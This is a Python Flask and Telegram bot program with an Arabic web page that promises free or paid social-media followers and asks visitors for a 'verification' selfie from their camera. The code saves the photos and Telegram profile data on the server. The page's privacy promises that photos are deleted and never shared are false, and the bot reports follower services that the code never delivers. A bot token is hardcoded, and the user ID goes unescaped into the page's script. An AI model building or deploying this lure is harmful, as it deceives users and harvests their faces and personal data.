import os
import logging
import uuid
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import asyncio
from threading import Thread
import time
import json
from datetime import datetime

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('photos'):
    os.makedirs('photos')
if not os.path.exists('data'):
    os.makedirs('data')

# تخزين البيانات
def load_user_data():
    try:
        with open('data/users.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_data(data):
    with open('data/users.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

def load_photos_data():
    try:
        with open('data/photos.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_photos_data(data):
    with open('data/photos.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False)

# ========== HTML قوالب ==========
MAIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة المتابعين - احصل على 100 متابع مجاناً</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* الهيدر */
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 3rem;
            color: #4CAF50;
            margin-bottom: 15px;
        }
        
        h1 {
            color: #2d3748;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #718096;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        
        .free-badge {
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            color: #000;
            padding: 10px 25px;
            border-radius: 50px;
            font-weight: bold;
            font-size: 1.3rem;
            display: inline-block;
            margin: 10px 0;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }
        
        /* الباقات */
        .packages {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .package {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .package:hover {
            transform: translateY(-10px);
        }
        
        .package.featured {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            transform: scale(1.05);
        }
        
        .package.featured:hover {
            transform: scale(1.08) translateY(-5px);
        }
        
        .package-icon {
            font-size: 3rem;
            margin-bottom: 20px;
        }
        
        .package-title {
            font-size: 1.5rem;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .package-followers {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #4CAF50;
        }
        
        .package.featured .package-followers {
            color: #FFD700;
        }
        
        .package-price {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #718096;
        }
        
        .package.featured .package-price {
            color: #fff;
        }
        
        /* الأيقونات */
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }
        
        .social-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: #667eea;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .social-icon:hover {
            transform: translateY(-5px);
            background: #667eea;
            color: white;
        }
        
        /* زر الكاميرا */
        .camera-section {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            margin: 30px 0;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 8px 25px rgba(76, 175, 80, 0.3);
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(76, 175, 80, 0.4);
        }
        
        .btn-large {
            padding: 25px 50px;
            font-size: 1.4rem;
        }
        
        /* سياسة الخصوصية */
        .privacy-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(5px);
        }
        
        .privacy-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 20px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .privacy-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
        }
        
        .btn-accept {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
        }
        
        .btn-decline {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        
        /* الكاميرا */
        .camera-container {
            position: relative;
            margin: 20px 0;
        }
        
        #video, #canvas {
            width: 100%;
            max-width: 500px;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        }
        
        .hidden {
            display: none;
        }
        
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            font-weight: 500;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .packages {
                grid-template-columns: 1fr;
            }
            
            .package.featured {
                transform: none;
            }
            
            .package.featured:hover {
                transform: translateY(-5px);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-users"></i>
            </div>
            <h1>زيادة المتابعين الحقيقية</h1>
            <p class="subtitle">احصل على آلاف المتابعين الحقيقين لجميع منصات السوشيال ميديا</p>
            <div class="free-badge">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً الآن!
            </div>
        </div>

        <!-- أيقونات السوشيال ميديا -->
        <div class="social-icons">
            <a href="#" class="social-icon">
                <i class="fab fa-instagram"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-tiktok"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-youtube"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="social-icon">
                <i class="fab fa-facebook"></i>
            </a>
        </div>

        <!-- الباقات -->
        <div class="packages">
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="package-title">الباقة الأساسية</div>
                <div class="package-followers">1,000 متابع</div>
                <div class="package-price">$9.99</div>
                <button class="btn" onclick="showCamera('basic')">اختر الباقة</button>
            </div>
            
            <div class="package featured">
                <div class="package-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="package-title">الباقة المميزة</div>
                <div class="package-followers">5,000 متابع</div>
                <div class="package-price">$29.99</div>
                <button class="btn" onclick="showCamera('premium')">اختر الباقة</button>
            </div>
            
            <div class="package">
                <div class="package-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <div class="package-title">الباقة الذهبية</div>
                <div class="package-followers">10,000 متابع</div>
                <div class="package-price">$49.99</div>
                <button class="btn" onclick="showCamera('gold')">اختر الباقة</button>
            </div>
        </div>

        <!-- قسم الكاميرا -->
        <div class="camera-section" id="cameraSection" style="display: none;">
            <h2>📸 التحقق من الهوية</h2>
            <p>لضمان حماية حسابك، يرجى التقاط صورة سيلفي بسيطة</p>
            
            <div class="camera-container">
                <video id="video" autoplay playsinline class="hidden"></video>
                <canvas id="canvas" class="hidden"></canvas>
            </div>
            
            <div>
                <button class="btn" onclick="startCamera()" id="startBtn">
                    <i class="fas fa-camera"></i> تشغيل الكاميرا
                </button>
                <button class="btn" onclick="capturePhoto()" id="captureBtn" class="hidden">
                    <i class="fas fa-camera-retro"></i> التقاط صورة
                </button>
                <button class="btn" onclick="retakePhoto()" id="retakeBtn" class="hidden">
                    <i class="fas fa-redo"></i> إعادة الالتقاط
                </button>
                <button class="btn" onclick="sendPhoto()" id="sendBtn" class="hidden">
                    <i class="fas fa-paper-plane"></i> إرسال الصورة
                </button>
            </div>
            
            <div id="status"></div>
        </div>

        <!-- زر الحصول على المتابعين المجانية -->
        <div class="camera-section">
            <h2>🎁 احصل على 100 متابع مجاناً!</h2>
            <p>انقر أدناه لبدء عملية الحصول على المتابعين المجانية</p>
            <button class="btn btn-large" onclick="showCamera('free')">
                <i class="fas fa-gift"></i> احصل على 100 متابع مجاناً
            </button>
        </div>
    </div>

    <!-- سياسة الخصوصية -->
    <div id="privacyModal" class="privacy-modal">
        <div class="privacy-content">
            <h2>📋 سياسة الخصوصية والأذونات</h2>
            <p><strong>نحن نحترم خصوصيتك ونلتزم بحماية بياناتك الشخصية.</strong></p>
            
            <h3>الأذونات المطلوبة:</h3>
            <ul>
                <li>✅ الوصول إلى الكاميرا لالتقاط صورة التحقق</li>
                <li>✅ تخزين بياناتك الأساسية لتقديم الخدمة</li>
                <li>✅ إرسال إشعارات حول حالة طلبك</li>
            </ul>
            
            <h3>كيف نستخدم بياناتك:</h3>
            <ul>
                <li>📸 نستخدم الصورة للتحقق من هويتك فقط</li>
                <li>🔒 لا نشارك بياناتك مع أي طرف ثالث</li>
                <li>⏰ نحذف الصورة بعد اكتمال التحقق</li>
                <li>🛡️ بياناتك محمية بتقنيات التشفير</li>
            </ul>
            
            <p>بالنقر على "موافق" فإنك توافق على شروط الخدمة وسياسة الخصوصية.</p>
            
            <div class="privacy-actions">
                <button class="btn btn-accept" onclick="acceptPrivacy()">
                    <i class="fas fa-check"></i> موافق
                </button>
                <button class="btn btn-decline" onclick="declinePrivacy()">
                    <i class="fas fa-times"></i> غير موافق
                </button>
            </div>
        </div>
    </div>

    <script>
        let stream = null;
        let photoData = null;
        let selectedPackage = '';
        let privacyAccepted = false;

        // عرض سياسة الخصوصية
        function showCamera(packageType) {
            selectedPackage = packageType;
            if (!privacyAccepted) {
                document.getElementById('privacyModal').style.display = 'block';
            } else {
                startCameraFlow();
            }
        }

        function acceptPrivacy() {
            privacyAccepted = true;
            document.getElementById('privacyModal').style.display = 'none';
            startCameraFlow();
        }

        function declinePrivacy() {
            document.getElementById('privacyModal').style.display = 'none';
            alert('نأسف! لا يمكننا تقديم الخدمة بدون موافقتك على الشروط.');
        }

        function startCameraFlow() {
            document.getElementById('cameraSection').style.display = 'block';
            document.getElementById('cameraSection').scrollIntoView({ behavior: 'smooth' });
            startCamera();
        }

        async function startCamera() {
            try {
                updateStatus('⏳ جاري تشغيل الكاميرا...', 'info');
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.classList.remove('hidden');
                
                document.getElementById('startBtn').classList.add('hidden');
                document.getElementById('captureBtn').classList.remove('hidden');
                
                updateStatus('✅ الكاميرا جاهزة - يمكنك التقاط الصورة الآن', 'success');
                
            } catch (error) {
                console.error('Error accessing camera:', error);
                let errorMessage = '❌ فشل في الوصول إلى الكاميرا';
                
                if (error.name === 'NotAllowedError') {
                    errorMessage = '❌ تم رفض الإذن - يرجى السماح بالوصول إلى الكاميرا';
                } else if (error.name === 'NotFoundError') {
                    errorMessage = '❌ لم يتم العثور على كاميرا';
                }
                
                updateStatus(errorMessage, 'error');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            // إيقاف الكاميرا
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            photoData = canvas.toDataURL('image/jpeg', 0.8);
            canvas.classList.remove('hidden');
            video.classList.add('hidden');
            document.getElementById('captureBtn').classList.add('hidden');
            document.getElementById('retakeBtn').classList.remove('hidden');
            document.getElementById('sendBtn').classList.remove('hidden');
            
            updateStatus('✅ تم التقاط الصورة بنجاح - يمكنك إرسالها الآن', 'success');
        }

        function retakePhoto() {
            const canvas = document.getElementById('canvas');
            canvas.classList.add('hidden');
            document.getElementById('retakeBtn').classList.add('hidden');
            document.getElementById('sendBtn').classList.add('hidden');
            document.getElementById('startBtn').classList.remove('hidden');
            photoData = null;
            updateStatus('🔄 يمكنك إعادة تشغيل الكاميرا', 'info');
        }

        async function sendPhoto() {
            if (!photoData) {
                updateStatus('❌ لا توجد صورة مرفوعة', 'error');
                return;
            }

            updateStatus('⏳ جاري إرسال الصورة وتفعيل الخدمة...', 'info');
            document.getElementById('sendBtn').disabled = true;

            try {
                // تحويل Base64 إلى Blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // إنشاء FormData وإرسال الصورة
                const formData = new FormData();
                formData.append('photo', blob, 'verification.jpg');
                formData.append('user_id', '{{user_id}}');
                formData.append('package', selectedPackage);

                const uploadResponse = await fetch('/upload_photo', {
                    method: 'POST',
                    body: formData
                });

                const result = await uploadResponse.json();
                
                if (result.success) {
                    updateStatus('✅ تم إرسال الصورة بنجاح! جاري تفعيل ' + getPackageName(selectedPackage), 'success');
                    
                    setTimeout(() => {
                        updateStatus('🎉 تم تفعيل الخدمة! ستصل متابعينك قريباً.', 'success');
                    }, 2000);
                    
                } else {
                    updateStatus('❌ فشل في الإرسال: ' + result.error, 'error');
                    document.getElementById('sendBtn').disabled = false;
                }

            } catch (error) {
                console.error('Upload error:', error);
                updateStatus('❌ خطأ في الاتصال - يرجى المحاولة مرة أخرى', 'error');
                document.getElementById('sendBtn').disabled = false;
            }
        }

        function getPackageName(packageType) {
            const packages = {
                'free': '100 متابع مجاناً',
                'basic': 'باقة 1000 متابع',
                'premium': 'باقة 5000 متابع',
                'gold': 'باقة 10000 متابع'
            };
            return packages[packageType] || 'الخدمة';
        }

        function updateStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
        }

        // إظهار سياسة الخصوصية تلقائياً عند التحميل
        window.addEventListener('load', function() {
            // يمكن تفعيل هذا إذا أردت إظهار السياسة تلقائياً
            // document.getElementById('privacyModal').style.display = 'block';
        });
    </script>
</body>
</html>
"""

CAMERA_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقط صورة - زيادة المتابعين</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            margin: 0 auto;
        }
        button {
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        #video, #canvas {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin: 10px 0;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 التقط صورة للتحقق</h1>
        <p>سيتم إرسال الصورة للبوت وتفعيل خدمتك</p>
        
        <video id="video" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        
        <div>
            <button onclick="startCamera()">تشغيل الكاميرا</button>
            <button onclick="capturePhoto()" id="captureBtn" class="hidden">التقاط صورة</button>
            <button onclick="sendPhoto()" id="sendBtn" class="hidden">إرسال للبوت</button>
        </div>
        
        <div id="status"></div>
    </div>

    <script>
        let stream = null;
        let photoData = null;

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.classList.remove('hidden');
                document.getElementById('captureBtn').classList.remove('hidden');
            } catch (error) {
                alert('خطأ في تشغيل الكاميرا');
            }
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            stream.getTracks().forEach(track => track.stop());
            
            photoData = canvas.toDataURL('image/jpeg');
            canvas.classList.remove('hidden');
            video.classList.add('hidden');
            document.getElementById('sendBtn').classList.remove('hidden');
        }

        async function sendPhoto() {
            const response = await fetch(photoData);
            const blob = await response.blob();
            
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            formData.append('user_id', '{{user_id}}');

            const uploadResponse = await fetch('/upload_photo', {
                method: 'POST',
                body: formData
            });

            const result = await uploadResponse.json();
            document.getElementById('status').innerHTML = result.success ? 
                '✅ تم الإرسال بنجاح!' : '❌ فشل في الإرسال';
        }
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Bot is running! Use /start in Telegram"

@app.route('/user/<user_id>')
def user_page(user_id):
    """الصفحة الرئيسية للمستخدم"""
    return render_template_string(MAIN_HTML, user_id=user_id)

@app.route('/camera/<user_id>')
def camera_page(user_id):
    """صفحة الكاميرا البسيطة"""
    return render_template_string(CAMERA_HTML, user_id=user_id)

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    """استقبال الصور من صفحة الويب"""
    try:
        if 'photo' not in request.files:
            return jsonify({'success': False, 'error': 'No photo uploaded'})
        
        photo = request.files['photo']
        user_id = request.form.get('user_id')
        package = request.form.get('package', 'free')
        
        if photo and user_id:
            # حفظ الصورة
            filename = f"photo_{user_id}_{uuid.uuid4().hex[:8]}.jpg"
            filepath = os.path.join('photos', filename)
            photo.save(filepath)
            
            # حفظ بيانات الصورة
            photos_data = load_photos_data()
            photos_data[filename] = {
                'user_id': user_id,
                'package': package,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            }
            save_photos_data(photos_data)
            
            # إرسال الصورة للبوت
            asyncio.run(send_photo_to_bot(user_id, filepath, package))
            
            return jsonify({
                'success': True, 
                'message': 'تم استلام الصورة بنجاح وتفعيل الخدمة',
                'filename': filename,
                'package': package
            })
        else:
            return jsonify({'success': False, 'error': 'Missing user_id or photo'})
        
    except Exception as e:
        print(f"❌ خطأ في رفع الصورة: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ========== وظائف التليجرام ==========
async def send_photo_to_bot(user_id, photo_path, package):
    """إرسال الصورة للمستخدم عبر البوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # تحويل user_id إلى integer
        user_id_int = int(user_id)
        
        # إرسال الصورة
        with open(photo_path, 'rb') as photo_file:
            await application.bot.send_photo(
                chat_id=user_id_int,
                photo=InputFile(photo_file),
                caption=f"📸 تم استلام صورتك بنجاح!\n\n🎁 الباقة: {get_package_name(package)}\n⏰ جاري تفعيل الخدمة...\n\nشكراً لاستخدامك خدمتنا!",
                parse_mode='HTML'
            )
        
        # إرسال رسالة تأكيد
        await application.bot.send_message(
            chat_id=user_id_int,
            text=f"✅ تم تفعيل {get_package_name(package)} بنجاح!\n\nستبدأ متابعينك بالوصول خلال 24 ساعة.\n\nللاستفسار: @{'your_support_username'}",
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال الصورة للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال الصورة للبوت: {e}")

def get_package_name(package_type):
    """الحصول على اسم الباقة"""
    packages = {
        'free': '🎁 100 متابع مجاناً',
        'basic': '⭐ باقة 1000 متابع',
        'premium': '👑 باقة 5000 متابع', 
        'gold': '🚀 باقة 10000 متابع'
    }
    return packages.get(package_type, 'خدمة المتابعين')

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # حفظ بيانات المستخدم
        user_data = load_user_data()
        if str(user_id) not in user_data:
            user_data[str(user_id)] = {
                'username': user.username,
                'first_name': user.first_name,
                'join_date': datetime.now().isoformat(),
                'photos_count': 0
            }
            save_user_data(user_data)
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/user/{user_id}"
        
        welcome_text = f"""
        🎉 أهلاً بك {user.first_name} في بوت زيادة المتابعين!

        📱 **رابطك الخاص:**
        {user_url}

        ⚡ **مميزات الخدمة:**
        ✅ متابعين حقيقين 100%
        ✅ خدمة 24/7
        ✅ أسعار مناسبة
        ✅ دعم فني متواصل

        🎁 **احصل على 100 متابع مجاناً الآن!**

        💡 **كيفية الاستخدام:**
        1. افتح الرابط أعلاه
        2. اختر الباقة المناسبة
        3. التقط صورة للتحقق
        4. استلم متابعينك!

        🔒 **بياناتك محمية بشكل كامل**
        """
        
        await update.message.reply_text(welcome_text)
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
        🤖 **أوامر البوت:**

        /start - بدء البوت والحصول على الرابط الخاص
        /help - عرض الرسالة المساعدة
        /status - حالة طلباتك

        📞 **الدعم الفني:**
        @{'your_support_username'}

        🕒 **أوقات العمل:**
        24/7
        """
        await update.message.reply_text(help_text)

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /status"""
        user_id = update.effective_user.id
        photos_data = load_photos_data()
        
        user_photos = [p for p in photos_data.values() if p['user_id'] == str(user_id)]
        
        if user_photos:
            status_text = "📊 **حالة طلباتك:**\n\n"
            for photo in user_photos[-5:]:  # آخر 5 طلبات
                status_text += f"📸 {get_package_name(photo['package'])} - ✅ منشط\n"
        else:
            status_text = "📭 لم تقم بأي طلبات بعد.\nاستخدم /start لبدء الخدمة!"
        
        await update.message.reply_text(status_text, parse_mode='HTML')

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالج الأخطاء"""
        print(f"❌ خطأ في البوت: {context.error}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_error_handler(self.error_handler)

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            # إبقاء البوت يعمل
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)  # انتظار بسيط لضمان تشغيل الخادم أولاً
        
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل التطبيق...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    
    # تشغيل الخادم والبوت في خيوط منفصلة
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    # إبقاء البرنامج الرئيسي يعمل
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
